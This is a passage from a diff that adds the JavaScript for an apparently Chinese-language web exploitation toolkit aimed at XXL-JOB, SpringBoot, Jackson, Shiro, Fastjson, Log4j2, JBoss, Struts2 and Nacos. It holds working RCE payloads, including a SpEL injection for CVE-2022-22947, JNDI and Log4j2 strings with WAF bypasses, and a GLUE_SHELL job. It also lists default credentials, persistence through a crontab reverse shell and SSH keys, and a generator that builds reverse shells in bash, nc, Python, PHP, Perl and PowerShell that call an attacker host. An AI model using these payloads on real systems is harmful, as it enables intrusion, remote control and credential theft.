+     p:'{\n  "jobId": 1,\n  "executorHandler": "demoJobHandler",\n  "executorParams": "",\n  "executorBlockStrategy": "COVER_EARLY",\n  "executorTimeout": 0,\n  "logId": 1,\n  "logDateTime": 1586629003729,\n  "glueType": "GLUE_SHELL",\n  "glueSource": "bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1",\n  "glueUpdatetime": 1586699003758,\n  "broadcastIndex": 0,\n  "broadcastTotal": 0\n}',
+     cmd:'# 攻击机先监听：nc -lvnp {{lport}}'},
+    {t:'③ 调度中心默认口令',d:'<span class="red">admin / 123456</span>',p:'',
+     cmd:'curl -s -X POST "{{target2}}/xxl-job-admin/login" -d "userName=admin&password=123456" -c cookie.txt'},
+    {t:'④ 登录后下发任务（GUI 路径）',d:'',p:'',
+     cmd:'# 1) 登录 /xxl-job-admin/\n# 2) 执行器管理 → 新增执行器\n# 3) 任务管理 → 新增任务，运行模式选 GLUE(Shell)\n# 4) 填写命令 → 执行一次'},
+    {t:'⑤ 提权方式',d:'拿到执行权限后的持久化/提权',p:'',
+     cmd:'# 写 webshell（找到 web 根目录）\n# 写公钥：echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys\n# 写定时任务：(crontab -l; echo "* * * * * bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1") | crontab -'}
+  ]},
+  springboot:{name:'SpringBoot',icon:'🍃',items:[
+    {t:'① Actuator 信息泄露',d:'<span class="red">先枚举全部端点</span>',p:'',cmd:'curl -s {{target}}/actuator | python3 -m json.tool'},
+    {t:'② heapdump 提取凭据',d:'<span class="red">下载后用 JDumpSpider 提取明文密码</span>',
+     p:'',cmd:'curl -s -o heapdump.hprof {{target}}/actuator/heapdump\npython3 JDumpSpider.jar heapdump.hprof\n# 工具：https://github.com/whwlsfb/JDumpSpider\n#      https://github.com/wyzxxz/heapdump_tool\n#      https://github.com/DeEpinGh0st/JDumpSpiderGUI'},
+    {t:'③ env 端点泄露',d:'',p:'',cmd:'curl -s {{target}}/actuator/env | python3 -m json.tool'},
+    {t:'④ Spring Cloud Gateway RCE（CVE-2022-22947）',d:'<span class="red">构造含恶意 SpEL 的路由 → 刷新触发 RCE</span>',
+     p:'{\n  "id": "hacktest",\n  "filters": [{\n    "name": "AddResponseHeader",\n    "args": {\n      "name": "Result",\n      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"{{cmd}}\\"}).getInputStream()))}"\n    }\n  }],\n  "uri": "http://example.com"\n}',
+     cmd:'# 1) 添加恶意路由\ncurl -s -X POST "{{target}}/actuator/gateway/routes/hacktest" -H "Content-Type: application/json" -d \'<上面的 JSON>\'\n# 2) 刷新触发\ncurl -s -X POST "{{target}}/actuator/gateway/refresh"\n# 3) 读取结果\ncurl -s "{{target}}/actuator/gateway/routes"\n# 4) 清理\ncurl -s -X DELETE "{{target}}/actuator/gateway/routes/hacktest"'},
+    {t:'⑤ 框架专扫工具',d:'',p:'',
+     cmd:'python3 SBSCAN.py -u {{target}}\n# https://github.com/sule01u/SBSCAN\n# https://gitee.com/team-man/spring-scan\n# https://github.com/CllmsyK/YYBaby-Spring_Scan\n# https://github.com/wh1t3zer/SpringBootVul-GUI'}
+  ]},
+  jackson:{name:'Jackson',icon:'🧩',items:[
+    {t:'① JNDI 注入（JdbcRowSetImpl）',d:'<span class="red">需目标开启 enableDefaultTyping / activateDefaultTyping</span>',
+     p:'{\n  "obj": {\n    "@class": "com.sun.rowset.JdbcRowSetImpl",\n    "dataSourceName": "ldap://{{lhost}}:1389/Exploit",\n    "autoCommit": true\n  }\n}',
+     cmd:'# 攻击机起 LDAP：java -jar JNDIExploit-1.4-SNAPSHOT.jar -i {{lhost}}'},
+    {t:'② @class 探测 payload',d:'验证是否开启多态类型',p:'{"obj":{"@class":"java.net.Inet4Address","val":"{{dns}}"}}',cmd:''},
+    {t:'③ 利用前置条件检查',d:'<span class="red">Jackson 默认不开启多态类型，必须开发者显式 enableDefaultTyping() 才有风险</span>——这是它和 fastjson 最大的区别',
+     p:'',cmd:''},
+    {t:'④ 常见 gadget CVE',d:'CVE-2017-7525、CVE-2017-17485、CVE-2018-14718 系列、CVE-2019-12384、CVE-2020-25649、CVE-2020-35490/35491、CVE-2020-36179~36189',
+     p:'',cmd:'# JDK 8u191+ 默认禁 LDAP 远程工厂类加载，需改用其他 gadget\n# 建议升级 jackson-databind >= 2.12 / 2.13'}
+  ]}
+};
+
+/* ---------- 利用流程 ---------- */
+const FLOW = {
+  shiro:{name:'Shiro 反序列化',steps:[
+    '① 指纹：任意请求带 <span class="red">Cookie: rememberMe=deleteMe;</span>，看响应 Set-Cookie 是否出现 rememberMe=deleteMe',
+    '② 判型：能拿到/爆破出 key → <span class="red">Shiro-550</span>；key 随机 → 用合法 Cookie 走 <span class="red">Shiro-721 Padding Oracle</span>',
+    '③ 准备：下载 ysoserial-all.jar（<span class="red">用 JDK 8 运行</span>），攻击机开 JRMP 监听端口 {{jrmp}}',
+    '④ 生成：python3 shiropoc.py {{lhost}}:{{jrmp}} 得到 rememberMe 值（需要 pycryptodome）',
+    '⑤ 发送：Burp Repeater 或 curl 把 <span class="red">Cookie: rememberMe=xxx</span> 打过去',
+    '⑥ 收 shell：nc -lvvp {{lport}}',
+    '⑦ 不出网：改用内存马 / 回显链 / 写静态文件读取（ShiroAttack2 自带）',
+    '⑧ 工具推荐：<span class="red">ShiroAttack2 / shiro_attack</span>（自动爆破 key + 选链 + 执行命令 + 内存马）'
+  ]},
+  fastjson:{name:'Fastjson',steps:[
+    '① 指纹：找 JSON 传输接口，发 <span class="red">{"@type":"java.lang.AutoCloseable"</span> 看报错是否带 fastjson',
+    '② 出网判定：DNSLog payload 测试目标能否出网',
+    '③ 版本判定：用<span class="red">布尔判定三件套</span>确定版本区间（&lt;1.2.24 / 1.2.24-47 / 48-68 / 70-83）',
+    '④ 选链：出网 → JdbcRowSetImpl + JNDI(RMI/LDAP)；不出网 → <span class="red">BCEL 链（Tomcat/SpringBoot 首选）</span>',
+    '⑤ 起服务：JNDIExploit 一键起 LDAP/RMI（java -jar JNDIExploit.jar -i {{lhost}}）',
+    '⑥ 打 payload：POST JSON，Content-Type: application/json',
+    '⑦ 拿结果：命令执行 / 反弹 shell / 注入内存马',
+    '⑧ 绕过：WAF 拦截时用 <span class="red">Unicode 编码</span> 或其他 @type 包装类'
+  ]},
+  log4j2:{name:'Log4j2',steps:[
+    '① 识别：Log4j2 <span class="red">无明显指纹</span>，收集所有可能被记日志的输入点',
+    '② 探测：在所有输入点（UA/Referer/XFF/参数/用户名）打 <span class="red">${jndi:ldap://{{dns}}/a}</span>',
+    '③ 确认：DNSLog 收到请求 = 存在且可触发 Lookup',
+    '④ 利用：起 JNDIExploit → 打 <span class="red">${jndi:ldap://{{lhost}}:1389/Basic/Command/{{cmd}}}</span>',
+    '⑤ 绕过：被 WAF 拦就用嵌套变体 <span class="red">${${lower:j}ndi:...}</span>',
+    '⑥ 不出网：用 <span class="red">${java:version} / ${env:XXX}</span> 把信息从 DNSLog 带出来',
+    '⑦ 注意：JDK 8u191+ 禁 LDAP 远程类加载，需换利用方式或结合其他链'
+  ]},
+  jboss:{name:'JBoss',steps:[
+    '① 指纹：8080/9990 端口 → 标题 Welcome to JBoss AS → <span class="red">/jmx-console/</span> → /invoker/readonly',
+    '② 枚举入口：/invoker/readonly（CVE-2017-12149）、/jbossmq-httpil/HTTPServerILServlet（CVE-2017-7504）、/jmx-console（未授权）',
+    '③ 生成 payload：<span class="red">ysoserial + JDK 8</span>，CommonsCollections5（高 JDK 换 CC6/CC7）',
+    '④ 反弹命令必须 <span class="red">Base64 包装</span>（Runtime.exec 不支持管道符/重定向）',
+    '⑤ 发送：curl -X POST --data-binary @payload.ser {{target}}/invoker/readonly',
+    '⑥ 收 shell：nc -lvnp {{lport}}',
+    '⑦ 备选：JMX Console 用 <span class="red">admin/admin</span> 登录上传 war getshell'
+  ]},
+  struts2:{name:'Struts2',steps:[
+    '① 指纹：<span class="red">.action / .do</span> 后缀、Struts Problem Report 报错页、whatweb',
+    '② 探测：Content-Type 打无害 OGNL，响应出现标记串即确认 OGNL 可执行',
+    '③ 定编号：根据版本对照 S2-016 / 045 / 057 / 059 / 061 / 062 / 067',
+    '④ 打 payload：S2-045 直接把 OGNL 放 <span class="red">Content-Type 头</span>，命令回显在响应体里',
+    '⑤ 换命令：改 <span class="red">#cmd=\'你的命令\'</span> 即可，无需起额外服务',
+    '⑥ 反弹：#cmd 换成 bash -i &gt;&amp; /dev/tcp/...',
+    '⑦ 工具：Struts2Scan 一键扫 + 打（自带多 CVE）'
+  ]},
+  nacos:{name:'Nacos',steps:[
+    '① 指纹：8848 端口 → /nacos/ 登录页',
+    '② 未授权：<span class="red">/nacos/v1/auth/users?pageNo=1&pageSize=9</span> 能否直接列出用户',
+    '③ 绕过：加 <span class="red">User-Agent: Nacos-Server</span> 头重试',
+    '④ 默认口令：<span class="red">nacos / nacos</span>',
+    '⑤ 拿配置：<span class="red">/nacos/v1/cs/configs</span> 读数据库密码、密钥',
+    '⑥ RCE：≤2.2.0 用 Derby 恶意 SQL 加载 Java 类（NacosExploitGUI / nacosRce）',
+    '⑦ 横向：用拿到的数据库凭据和内网地址继续扩展'
+  ]},
+  xxljob:{name:'XXL-JOB',steps:[
+    '① 指纹：8080 <span class="red">/xxl-job-admin/</span>；执行器 <span class="red">9999 /run</span>',
+    '② 鉴权探测：POST /run 看返回是否 <span class="red">"The job trigger request is valid"</span>',
+    '③ 方式 A（执行器可达）：直接 POST /run，<span class="red">glueType=GLUE_SHELL，glueSource=命令</span>',
+    '④ 方式 B（仅调度中心）：默认口令 <span class="red">admin/123456</span> 登录 → 加执行器 → 下发 GLUE 任务',
+    '⑤ 提权：写 webshell / 写 SSH 公钥 / 写 crontab',
+    '⑥ 注意：<span class="red">2.2.0+ 才有 RESTful API</span>；2.1.2 及以下走 Hessian 反序列化（XxlJob-Hessian-RCE）'
+  ]},
+  springboot:{name:'SpringBoot',steps:[
+    '① 指纹：<span class="red">Whitelabel Error Page</span>、叶子图标、/actuator',
+    '② 专扫：<span class="red">SBSCAN</span> 一键识别框架并找漏洞点',
+    '③ 枚举端点：/actuator → env / beans / mappings / heapdump / gateway/routes',
+    '④ heapdump：下载 → <span class="red">JDumpSpider</span> 提取明文账号密码',
+    '⑤ Gateway：有 /actuator/gateway/routes 就试 <span class="red">CVE-2022-22947 SpEL RCE</span>',
+    '⑥ 组合：拿到的凭据去打 Nacos / 数据库 / 后台'
+  ]},
+  jackson:{name:'Jackson',steps:[
+    '① 指纹：畸形 JSON 触发 <span class="red">com.fasterxml.jackson</span> 报错',
+    '② 关键：确认是否 <span class="red">@class 可用（开启 enableDefaultTyping）</span>——默认不开启，这是与 fastjson 的核心差异',
+    '③ 确认 gadget：看 classpath 有哪些 jar（依赖版本决定可用链）',
+    '④ 打 payload：@class + JdbcRowSetImpl + JNDI',
+    '⑤ 起 LDAP/RMI：marshalsec / JNDIExploit',
+    '⑥ 注意 JDK 8u191+ 限制，需换 gadget'
+  ]}
+};
+
+/* ---------- 工具库 ---------- */
+const TOOLS = {
+  gen:{name:'通用 / 一体化',items:[
+    ['ysoserial','Java 反序列化 payload 生成器（必备）','https://github.com/frohoff/ysoserial','java -jar ysoserial-all.jar [payload] "[command]"'],
+    ['marshalsec','起恶意 LDAP / RMI 服务','https://github.com/mbechler/marshalsec','java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{{lhost}}:8000/#Exploit"'],
+    ['JNDIExploit','JNDI 一键利用（推荐，内置命令执行/反弹/内存马）','https://github.com/WhiteHSBG/JNDIExploit','java -jar JNDIExploit-1.4-SNAPSHOT.jar -i {{lhost}}'],
+    ['nuclei','模板化漏洞扫描，全组件覆盖','https://github.com/projectdiscovery/nuclei','nuclei -l urls.txt -tags shiro,fastjson,log4j,struts,springboot,jboss,nacos,xxl-job'],
+    ['xray','长亭主动扫描','https://github.com/chaitin/xray','xray webscan --basic-crawler {{target}} --html-output r.html'],
+    ['pocsuite3','POC 批量验证框架','https://github.com/knownsec/pocsuite3','pocsuite -r poc.py -u {{target}}'],
+    ['Burp Suite','抓包改包，反序列化手工测试必备','https://portswigger.net/burp','Repeater 模块改 Cookie / Body 重放']
+  ]},
+  shiro:{name:'Shiro',items:[
+    ['ShiroAttack2','<span class="red">推荐</span>：爆破 key + Gadget 选择 + 命令执行 + 内存马','https://github.com/SummerSec/ShiroAttack2','java -jar shiro_attack-4.7.0-SNAPSHOT-all.jar'],
+    ['ShiroExploit','探测 key + 生成 rememberMe（已归档但经典）','https://github.com/feihong-cs/ShiroExploit-Deprecated','java -jar ShiroExploit.jar'],
+    ['shiro_attack','Python 版 Shiro 综合利用','—','python3 shiro_attack.py -u {{target}}'],
+    ['shiropoc.py','生成 rememberMe Cookie（课程配套脚本）','—','python3 shiropoc.py {{lhost}}:{{jrmp}}'],
+    ['ysoserial JRMPListener','JRMP 监听服务端','https://github.com/frohoff/ysoserial','java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener {{jrmp}} CommonsCollections5 "cmd"']
+  ]},
+  fastjson:{name:'Fastjson',items:[
+    ['BcelPayloadGenerator','fastjson BCEL 不出网 payload 生成','https://github.com/OneSourceCat/BcelPayloadGenerator','java -jar BcelPayloadGenerator.jar'],
+    ['fastJsonNoNetTool','BCEL 转码 + Payload 生成（GUI）','https://github.com/yeyeye888/fastJsonNoNetTool','java -jar fastJsonNoNetTool.jar'],
+    ['fastjsonScan','Burp 插件：版本探测 + 利用','https://github.com/zilong3033/fastjsonScan','Burp → Extender → 加载'],
+    ['JNDIExploit','起 LDAP/RMI 服务','https://github.com/WhiteHSBG/JNDIExploit','java -jar JNDIExploit-1.4-SNAPSHOT.jar -i {{lhost}}']
+  ]},
+  log4j2:{name:'Log4j2',items:[
+    ['JNDIExploit','一键起 LDAP/RMI + 命令执行','https://github.com/WhiteHSBG/JNDIExploit','java -jar JNDIExploit-1.4-SNAPSHOT.jar -i {{lhost}}'],
+    ['marshalsec','LDAP/RMI 参考服务','https://github.com/mbechler/marshalsec','java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://{{lhost}}:8000/#Exploit"'],
+    ['Log4j2Scan','批量 Log4j2 检测','—','python3 log4j2-scan.py -u {{target}}'],
+    ['DNSLog 平台','验证出网与漏洞存在','https://dnslog.cn / http://www.dnslog.cn','取一个子域名填到全局参数']
+  ]},
+  jboss:{name:'JBoss / Weblogic',items:[
+    ['ysoserial','生成 CC 链 payload','https://github.com/frohoff/ysoserial','java -jar ysoserial-all.jar CommonsCollections5 "cmd" > p.ser'],
+    ['nmap','T3 协议版本探测（Weblogic）','https://nmap.org','nmap -p 7001 --script weblogic-t3-info {{target}}'],
+    ['Java 8 便携版','高 JDK 无法跑 ysoserial 时临时用','https://adoptium.net/temurin/releases/?version=8','tar -xf jdk8.tar.gz && cd jdk8*/bin && ./java -jar ...']
+  ]},
+  struts2:{name:'Struts2',items:[
+    ['Struts2Scan','<span class="red">推荐</span>：自带多 CVE 扫描 + 利用','https://github.com/HatBoy/Struts2-Scan','python3 Struts2Scan.py -u {{target}}'],
+    ['bywalks','Java 版批量 Struts2 利用','—','java -jar bywalks.jar'],
+    ['nuclei struts 模板','批量扫描','https://github.com/projectdiscovery/nuclei','nuclei -l urls.txt -tags struts -severity critical']
+  ]},
+  springboot:{name:'SpringBoot',items:[
+    ['SBSCAN','<span class="red">推荐</span>：SpringBoot 专扫（识别 + Actuator 漏洞）','https://github.com/sule01u/SBSCAN','python3 SBSCAN.py -u {{target}}'],
+    ['spring-scan','框架扫描','https://gitee.com/team-man/spring-scan','—'],
+    ['YYBaby-Spring_Scan','SpringBoot 漏洞扫描','https://github.com/CllmsyK/YYBaby-Spring_Scan','—'],
+    ['SpringBootVul-GUI','GUI 版漏洞利用','https://github.com/wh1t3zer/SpringBootVul-GUI','—'],
+    ['JDumpSpider','heapdump 敏感信息提取','https://github.com/whwlsfb/JDumpSpider','java -jar JDumpSpider.jar heapdump.hprof'],
+    ['heapdump_tool','heapdump 提取','https://github.com/wyzxxz/heapdump_tool','python3 heapdump_tool.py heapdump.hprof'],
+    ['JDumpSpiderGUI','GUI 版提取','https://github.com/DeEpinGh0st/JDumpSpiderGUI','—']
+  ]},
+  nacos:{name:'Nacos',items:[
+    ['NacosExploitGUI','Nacos 一键利用（GUI）','—','—'],
+    ['nacosRce','Nacos RCE 脚本','—','python3 nacos_rce.py -u {{target}}'],
+    ['nuclei nacos 模板','批量检测','https://github.com/projectdiscovery/nuclei','nuclei -l urls.txt -tags nacos']
+  ]},
+  xxljob:{name:'XXL-JOB',items:[
+    ['xxl-job-exploit','执行器未授权 RCE 脚本','—','python3 xxljob-rce.py -u http://HOST:9999 -c "{{cmd}}"'],
+    ['nuclei xxl-job 模板','批量检测','https://github.com/projectdiscovery/nuclei','nuclei -l urls.txt -tags xxl-job'],
+    ['XxlJob-Hessian-RCE','2.1.2 及以下 Hessian 反序列化','—','—']
+  ]},
+  recon:{name:'资产收集 / 测绘',items:[
+    ['fofa','资产搜索','https://fofa.info','app="Nacos" / app="Shiro" / app="Spring-Boot" / port="8848"'],
+    ['quake','资产搜索','https://quake.360.net','app:"XXL-JOB"'],
+    ['hunter','资产搜索','https://hunter.qianxin.com','app="Fastjson"'],
+    ['httpx','批量存活探测','https://github.com/projectdiscovery/httpx','echo {{target}} | httpx -status-code -title'],
+    ['Wappalyzer / whatweb','技术栈指纹','https://www.wappalyzer.com','whatweb {{target}}'],
+    ['deserkit.py','<span class="red">本工具箱配套脚本</span>：批量指纹识别 + Payload 生成','—','python deserkit.py scan -f urls.txt']
+  ]}
+};
+
+/* ============================================================
+   逻辑
+   ============================================================ */
+const sel = {fp:new Set(), ver:new Set(), pay:new Set(), flow:new Set(), tool:new Set()};
+const DEF = {target:'http://192.168.184.162:8080',lhost:'192.168.184.132',lport:'9988',jrmp:'10099',
+             dns:'abc123.dnslog.cn',cmd:'id',key:'kPH+bIxk5D2deZiIxcaaaA=='};
+
+function ctx(){
+  const c = {
+    target: document.getElementById('g_target').value.trim(),
+    lhost: document.getElementById('g_lhost').value.trim(),
+    lport: document.getElementById('g_lport').value.trim(),
+    jrmp: document.getElementById('g_jrmp').value.trim(),
+    dns: document.getElementById('g_dns').value.trim(),
+    cmd: document.getElementById('g_cmd').value.trim(),
+    key: document.getElementById('g_key').value.trim()
+  };
+  // target2 = 只保留 scheme://host:port
+  const m = c.target.match(/^(https?:\/\/[^/]+)/);
+  c.target2 = m ? m[1] : c.target;
+  c.reverse = 'bash -i >& /dev/tcp/'+c.lhost+'/'+c.lport+' 0>&1';
+  c.b64shell_payload = b64(c.reverse);
+  /* Java Runtime.getRuntime().exec(String) 按空白 tokenize、不经过 shell：
+     把空格换成 ${IFS}（bash 自己展开成空格）→ 单个 argv，无需管道/引号/base64。
+     结尾必须是 ${IFS}<&1：写 ${IFS}0>&1 时重定向目标词展开成 2 段 → ambiguous redirect。 */
+  c.bashifs_shell = 'bash -c bash${IFS}-i${IFS}>&/dev/tcp/'+c.lhost+'/'+c.lport+'${IFS}<&1';
+  c.b64shell_full = c.bashifs_shell;
+  return c;
+}
+function b64(s){ try{ return btoa(unescape(encodeURIComponent(s))); }catch(e){ return s; } }
+function tpl(s,c){
+  if(s==null) return '';
+  return String(s).replace(/\{\{(\w+)\}\}/g,(m,k)=> (c[k]!==undefined?c[k]:m));
+}
+function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function codeBox(txt,id){
+  return '<pre class="code" id="'+id+'">'+esc(txt)+'</pre>';
+}
+function copyBtn(id){
+  return '<button class="btn" onclick="cp(\''+id+'\')">📋 复制</button>';
+}
+function cp(id){
+  const el = document.getElementById(id); if(!el) return;
+  const t = el.innerText;
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(t).then(()=>toast('已复制')).catch(()=>fallback(t));
+  } else fallback(t);
+}
+function fallback(t){
+  const ta=document.createElement('textarea'); ta.value=t; document.body.appendChild(ta);
+  ta.select(); document.execCommand('copy'); document.body.removeChild(ta); toast('已复制');
+}
+let tid=null;
+function toast(msg){ const e=document.getElementById('toast'); e.textContent=msg; e.classList.add('on');
+  clearTimeout(tid); tid=setTimeout(()=>e.classList.remove('on'),1400); }
+
+function buildChips(kind, dict, defOn){
+  const box = document.getElementById(kind+'Chips');
+  box.innerHTML='';
+  for(const k in dict){
+    const d = dict[k];
+    const el = document.createElement('div');
+    el.className='chip'+(defOn?' on':'');
+    el.textContent=(d.icon?d.icon+' ':'')+d.name;
+    el.dataset.k=k;
+    el.onclick=()=>{ el.classList.toggle('on');
+      if(el.classList.contains('on')) sel[kind].add(k); else sel[kind].delete(k); };
+    if(defOn) sel[kind].add(k);
+    box.appendChild(el);
+  }
+}
+function selAll(kind){ document.querySelectorAll('#'+kind+'Chips .chip').forEach(c=>{
+  c.classList.add('on'); sel[kind].add(c.dataset.k); }); }
+function selNone(kind){ document.querySelectorAll('#'+kind+'Chips .chip').forEach(c=>{
+  c.classList.remove('on'); sel[kind].delete(c.dataset.k); }); }
+
+/* ---- 渲染：指纹 ---- */
+function renderFp(){
+  const c=ctx(); const out=document.getElementById('fpOut');
+  const ks=[...sel.fp]; if(!ks.length){ out.innerHTML='<div class="card muted">请先选择组件</div>'; return; }
+  let h='';
+  ks.forEach((k,i)=>{
+    const d=FP[k]; if(!d) return;
+    h+='<div class="card"><h2>'+d.icon+' '+d.name+' 指纹识别</h2>';
+    h+='<table><tr><td class="k">默认端口</td><td>'+d.ports+'</td></tr>';
+    h+='<tr><td class="k">特征路径</td><td>'+d.paths.map(p=>'<code>'+esc(p)+'</code>').join('　')+'</td></tr></table>';
+    h+='<h3>识别要点</h3><table>';
+    d.points.forEach(p=>{ h+='<tr><td class="k">'+p[0]+'</td><td>'+p[1]+'</td></tr>'; });
+    h+='</table>';
+    h+='<h3>检测命令</h3>';
+    d.cmds.forEach((cm,j)=>{
+      const id='fp_'+k+'_'+i+'_'+j;
+      h+='<div class="pitem"><div class="hd"><span class="t">'+cm[0]+'</span>'+copyBtn(id)+'</div>';
+      h+='<div class="bd">'+codeBox(tpl(cm[1],c),id)+'</div></div>';
+    });
+    h+='</div>';
+  });
+  out.innerHTML=h;
+}
+
+/* ---- 渲染：版本探测 ---- */
+function renderVer(){
+  const c=ctx(); const out=document.getElementById('verOut');
+  const ks=[...sel.ver]; if(!ks.length){ out.innerHTML='<div class="card muted">请先选择组件</div>'; return; }
+  let h='';
+  ks.forEach(k=>{
+    const d=VER[k]; if(!d) return;
+    h+='<div class="card"><h2>'+d.name+' 版本探测</h2>';
+    d.items.forEach((it,j)=>{
+      const id='ver_'+k+'_'+j;
+      h+='<div class="pitem"><div class="hd"><span class="t">'+(j+1)+'. '+it.t+'</span>'+(it.p?copyBtn(id):'')+'</div>';
+      h+='<div class="bd">';
+      if(it.note) h+='<div class="small" style="margin-bottom:6px;">'+it.note+'</div>';
+      if(it.p) h+=codeBox(tpl(it.p,c),id);
+      if(it.how) h+='<div class="small muted" style="margin-top:6px;"><b>怎么用：</b>'+it.how+'</div>';
+      h+='</div></div>';
+    });
+    h+='</div>';
+  });
+  out.innerHTML=h;
+}
+
+/* ---- 渲染：Payload ---- */
+function renderPay(){
+  const c=ctx(); const out=document.getElementById('payOut');
+  const ks=[...sel.pay]; if(!ks.length){ out.innerHTML='<div class="card muted">请先选择组件</div>'; return; }
+  let h='';
+  ks.forEach(k=>{
+    const d=PAY[k]; if(!d) return;
+    h+='<div class="card"><h2>'+d.icon+' '+d.name+' 利用 Payload</h2>';
+    d.items.forEach((it,j)=>{
+      const idP='payP_'+k+'_'+j, idC='payC_'+k+'_'+j;
+      h+='<div class="pitem"><div class="hd"><span class="t">'+it.t+'</span>'+
+         (it.p?copyBtn(idP):'')+(it.cmd?copyBtn(idC):'')+'</div><div class="bd">';
+      if(it.d) h+='<div class="small" style="margin-bottom:6px;">'+it.d+'</div>';
+      if(it.p) h+=codeBox(tpl(it.p,c),idP);
+      if(it.cmd) h+='<div class="small muted" style="margin:8px 0 2px;"><b>配套命令：</b></div>'+codeBox(tpl(it.cmd,c),idC);
+      h+='</div></div>';
+    });
+    h+='</div>';
+  });
+  out.innerHTML=h;
+}
+
+/* ---- 渲染：利用流程 ---- */
+function renderFlow(){
+  const c=ctx(); const out=document.getElementById('flowOut');
+  const ks=[...sel.flow]; if(!ks.length){ out.innerHTML='<div class="card muted">请先选择组件</div>'; return; }
+  let h='';
+  ks.forEach(k=>{
+    const d=FLOW[k]; if(!d) return;
+    h+='<div class="card"><h2>'+d.name+' 完整利用流程</h2><table>';
+    d.steps.forEach((s,i)=>{ h+='<tr><td class="k" style="width:44px;">步骤 '+(i+1)+'</td><td>'+tpl(s,c)+'</td></tr>'; });
+    h+='</table></div>';
+  });
+  out.innerHTML=h;
+}
+
+/* ---- 渲染：工具库 ---- */
+function renderTools(){
+  const c=ctx(); const out=document.getElementById('toolOut');
+  const ks=[...sel.tool]; if(!ks.length){ out.innerHTML='<div class="card muted">请先选择分类</div>'; return; }
+  let h='';
+  ks.forEach(k=>{
+    const d=TOOLS[k]; if(!d) return;
+    h+='<div class="card"><h2>'+d.name+'</h2><table><tr><th style="width:150px;">工具</th><th style="width:290px;">说明</th><th style="width:300px;">地址</th><th>常用命令</th></tr>';
+    d.items.forEach((t,i)=>{
+      const id='tool_'+k+'_'+i;
+      h+='<tr><td><b>'+t[0]+'</b></td><td>'+t[1]+'</td><td>'+
+        (t[2].startsWith('http')?'<a href="'+t[2]+'" target="_blank" style="color:var(--accent);">'+esc(t[2])+'</a>':'<span class="muted">'+esc(t[2])+'</span>')+
+        '</td><td>'+codeBox(tpl(t[3],c),id)+copyBtn(id)+'</td></tr>';
+    });
+    h+='</table></div>';
+  });
+  out.innerHTML=h;
+}
+
+/* ---- 反弹 Shell ---- */
+function renderSh(){
+  const c=ctx(); const t=document.getElementById('shType').value;
+  const L=c.lhost,P=c.lport;
+  let s='', cmd='', note='';
+  if(t==='bash'){ s='bash -i >& /dev/tcp/'+L+'/'+P+' 0>&1';
+    cmd='# 攻击机监听：\nnc -lvnp '+P; note='最常用，目标需有 bash 和 /dev/tcp'; }
+  if(t==='bashifs'||t==='bashb64'){ s='bash -c bash${IFS}-i${IFS}>&/dev/tcp/'+L+'/'+P+'${IFS}<&1';
+    cmd='# 攻击机监听：\nnc -lvnp '+P;
+    note='<span class="red">Java Runtime.exec() 按空白 tokenize 且不经过 shell</span>：把空格换成 ${IFS}（bash 会展开成空格）→ 单个 argv，用于 ysoserial / Shiro / JBoss。<span class="red">结尾必须是 ${IFS}<&1</span>：写成 ${IFS}0>&1 会报 ambiguous redirect，连都不连'; }
+  if(t==='nc'){ s='nc -e /bin/bash '+L+' '+P;
+    cmd='# 攻击机监听：\nnc -lvnp '+P; note='需要目标 nc 支持 -e（传统 netcat）'; }
+  if(t==='ncmk'){ s='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+L+' '+P+' >/tmp/f';
+    cmd='# 攻击机监听：\nnc -lvnp '+P; note='nc 没有 -e 参数时的通用写法'; }
+  if(t==='py'){ s="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+L+"\","+P+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'";
+    cmd='# 攻击机监听：\nnc -lvnp '+P; note='目标有 python 时最稳'; }
+  if(t==='php'){ s='php -r \'$sock=fsockopen("'+L+'",'+P+');exec("/bin/bash -i <&3 >&3 2>&3");\'';
+    cmd='# 攻击机监听：\nnc -lvnp '+P; note='—'; }
+  if(t==='perl'){ s='perl -e \'use Socket;$i="'+L+'";$p='+P+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};\'';
+    cmd='# 攻击机监听：\nnc -lvnp '+P; note='—'; }
+  if(t==='powershell'){ s='$client = New-Object System.Net.Sockets.TCPClient("'+L+'",'+P+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
+    cmd='# 攻击机监听：\nnc -lvnp '+P; note='Windows 目标'; }
+  let h='<div class="card">';
+  h+='<h3>反弹 Shell</h3><div class="small muted" style="margin-bottom:6px;">'+note+'</div>';
+  h+=codeBox(s,'shOut1')+copyBtn('shOut1');
+  h+='<h3>Base64（用于 Runtime.exec）</h3>';
+  h+=codeBox(b64('bash -i >& /dev/tcp/'+L+'/'+P+' 0>&1'),'shOut2')+copyBtn('shOut2');
+  h+='<h3>攻击机命令</h3>';
+  h+=codeBox(cmd,'shOut3')+copyBtn('shOut3');
+  h+='<h3>URL 编码（用于 GET 参数 / Struts2）</h3>';
+  h+=codeBox(encodeURIComponent(s),'shOut4')+copyBtn('shOut4');
+  h+='</div>';
+  document.getElementById('shOut').innerHTML=h;
+}
+
+/* ---- 编码 ---- */
+function doEnc(mode){
+  const v=document.getElementById('encIn').value; let r='';
+  try{
